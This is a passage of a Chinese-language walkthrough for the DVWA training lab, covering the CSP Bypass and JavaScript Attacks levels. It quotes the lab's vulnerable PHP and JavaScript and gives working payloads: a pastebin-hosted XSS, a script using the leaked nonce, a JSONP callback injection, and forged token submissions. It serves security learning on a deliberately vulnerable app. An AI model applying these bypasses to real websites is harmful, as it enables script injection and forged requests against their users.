<form name="csp" method="POST">
    <p>You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:</p>
    <input size="50" type="text" name="include" value="" id="include" />
    <input type="submit" value="Include" />
</form>
';
```

分析源码不难看出白名单网址为

```
self
https://pastebin.com
example.com
code.jquery.com
https://ssl.google-analytics.com
```

其中 pastebin.com 是一个快速分享文本内容的网站，这个内容我们是可控的，可以在这里面插入 XSS 攻击语句：

```javascript
alert(document.cookie)
```

然后将网址https://pastebin.com/raw/2K8HVwTf填写到文本框中，提交即可触发XSS

### Medium

查看源码

```php
<?php

$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";

header($headerCSP);

// Disable XSS protections so that inline alert boxes will work
header ("X-XSS-Protection: 0");

# <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    " . $_POST['include'] . "
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.</p>
    <input size="50" type="text" name="include" value="" id="include" />
    <input type="submit" value="Include" />
</form>
';
```

http头信息中的script-src的合法来源发生了变化，说明如下

```php
unsafe-inline //允许使用内联资源，如内联< script>元素，javascript:URL，内联事件处理程序（如onclick）和内联< style>元素。必须包括单引号。
nonce-source  //仅允许特定的内联脚本块，nonce=“TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA”
```

直接输入以下代码

```javascript
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert("hahaha")</script
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-csp1.png)

注入成功

### High

查看源码

```php
<?php
$headerCSP = "Content-Security-Policy: script-src 'self';";

header($headerCSP);

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    " . $_POST['include'] . "
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>The page makes a call to ' . DVWA_WEB_PAGE_TO_ROOT . '/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.</p>
    <p>1+2+3+4+5=<span id="answer"></span></p>
    <input type="button" id="solve" value="Solve the sum" />
</form>

<script src="source/high.js"></script>
';
```

```javascript
function clickButton() {
    var s = document.createElement("script");
    s.src = "source/jsonp.php?callback=solveSum";
    document.body.appendChild(s);
}

function solveSum(obj) {
    if ("answer" in obj) {
        document.getElementById("answer").innerHTML = obj['answer'];
    }
}

var solve_button = document.getElementById ("solve");

if (solve_button) {
    solve_button.addEventListener("click", function() {
        clickButton();
    });
}
```

CSP 规则限制，只能引用允许`self` 的脚本执行，`self`是指本页面加载的脚本，服务器只信任自己的域名，只允许加载本界面的JavaScript代码，这样的话自能从客户端本身动手脚了

这关的突破点在于自己给参数，创造传参

POST 提交的 include 参数直接放到了 body 源码中

所以这里我们可以自己修改include 来进行弹窗

```javascript
include=<script src="source/jsonp.php?callback=alert('aha');"></script>
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-csp2.png)

### Impossible

```
<?php
header("Content-Type: application/json; charset=UTF-8");

$outp = array ("answer" => "15");

echo "solveSum (".json_encode($outp).")";
?>

echo "solveSum (".json_encode($outp).")";
function solveSum(obj) {
    if ("answer" in obj) {
        document.getElementById("answer").innerHTML = obj['answer'];
    }
}
```

这关直接把js写死了，只能回调 JS 里面的 solveSum 函数，所以就没办法啦

## JavaScript Attacks

这是一种比较新颖的玩法，通过捕获js中的漏洞进行，成功提交success就算赢

### Low

查看源码

```javascript
<?php
$page[ 'body' ] .= <<<EOF
<script>

/*
MD5 code from here
https://github.com/blueimp/JavaScript-MD5
*/

!function(n){"use strict";function t(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function r(n,t){return n<<t|n>>>32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t&r|~t&o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t&o|r&~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return e(r^(t|~o),n,t,u,c,f)}function i(n,r){n[r>>5]|=128<<r%32,n[14+(r+64>>>9<<4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e<n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]}function a(n){var t,r="",e=32*n.length;for(t=0;t<e;t+=8)r+=String.fromCharCode(n[t>>5]>>>t%32&255);return r}function d(n){var t,r=[];for(r[(n.length>>2)-1]=void 0,t=0;t<r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t<e;t+=8)r[t>>5]|=(255&n.charCodeAt(t/8))<<t%32;return r}function h(n){return a(i(d(n),8*n.length))}function l(n,t){var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length>16&&(o=i(o,8*n.length)),r=0;r<16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e="";for(r=0;r<n.length;r+=1)t=n.charCodeAt(r),e+="0123456789abcdef".charAt(t>>>4&15)+"0123456789abcdef".charAt(15&t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return t?r?s(t,n):C(t,n):r?m(n):p(n)}"function"==typeof define&&define.amd?define(function(){return A}):"object"==typeof module&&module.exports?module.exports=A:n.md5=A}(this);

    function rot13(inp) {
        return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);});
    }

    function generate_token() {
        var phrase = document.getElementById("phrase").value;
        document.getElementById("token").value = md5(rot13(phrase));
    }

    generate_token();
</script>
EOF;
?>
```

看着挺吓人，其实没什么东西，就是从github上弄了个md5运算的脚本然后在前端生成了一个token

F12审计一波，发现这里实际提交的是`ChangeMe`，不是succes

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-js1.png)

所以我们直接修改token的值，以实现提交succes的目标，通过console得到succes的token

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-js3.png)

然后修改填入即可

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-js4.png)

成功提交

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-js5.png)

### Medium

查看源码

```php
//medium.php
<?php
$page[ 'body' ] .= <<<EOF
<script src="/vulnerabilities/javascript/source/medium.js"></script>
EOF;
?>
```

```javascript
//medium.js
function do_something(e) {
    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
    return t
}
setTimeout(function () {
    do_elsesomething("XX")
}, 300);

function do_elsesomething(e) {
    document.getElementById("token").value = do_something(e + document.getElementById("phrase").value + "XX")
}
```

分析源码可知js代码中调用`do_elsesomething()`函数，而`do_elsesomething()`函数中有生成token的代码，其中将传入参数e、前端表单输入的`phrase`值以及”XX”字符串进行拼接再调用`do_something()`函数进行字符串翻转处理。

了解token的规律后，直接构造payload提交即可

```shell
token=XXsseccusXX&phrase=success&send=Submit
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-js6.png)

### High

查看源码，发现前端js代码被加密混淆

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-js7.png)

解密工具解密http://deobfuscatejavascript.com/#

解密后的源码

```javascript
function do_something(e) {
    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
    return t
}
function token_part_3(t, y = "ZZ") {
    document.getElementById("token").value = sha256(document.getElementById("token").value + y)
}
function token_part_2(e = "YY") {
    document.getElementById("token").value = sha256(e + document.getElementById("token").value)
}
function token_part_1(a, b) {
    document.getElementById("token").value = do_something(document.getElementById("phrase").value)
}
document.getElementById("phrase").value = "";
setTimeout(function() {
    token_part_2("XX")
}, 300);
document.getElementById("send").addEventListener("click", token_part_3);
token_part_1("ABCD", 44);
```

分析源码可知执行`token_part_2("XX")`，但是由于设置了延时，所以其实是先执行`token_part_1("ABCD", 44);`，再执行`token_part_2("XX")`，最后点击`click`的时候就会执行`token_part_3`。

无论我们想调试所有代码还是只调试指定的片段，主要的问题是如何将我们的反混淆代码插入到**http://localhost/dvwa/vulnerabilities/javascript/source/high.js**文件中；如果不解决这个问题，那么对混淆代码的调试将变得不可能，因为在控制权传递给真正的功能片段之前，之前的无意义代码可以执行数百万次操作。有一种方法可以摆脱这种情况——此外，即时更改文件并在重新加载页面后保存这些更改的功能直接在浏览器开发人员工具中。参考[如何在页面重新加载后保留浏览器开发人员工具中的更改](https://miloserdov.org/?p=4672)”。

插入反混淆代码，设置断点

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-js8.png)

将此页面添加到“**保存为覆盖**”并重新加载页面

最后到控制台里面设置 phrase 的值

```javascript
document.getElementById("phrase").value = "success";
```

然后就可以通关了

### Impossible

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-js9.png)

```
You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level.
```

你永远不能相信来自用户的任何东西或阻止他们弄乱它，所以没有不可能的水平。

没有绝对安全，除非你关服。

至此，DVWA靶场全部通关。

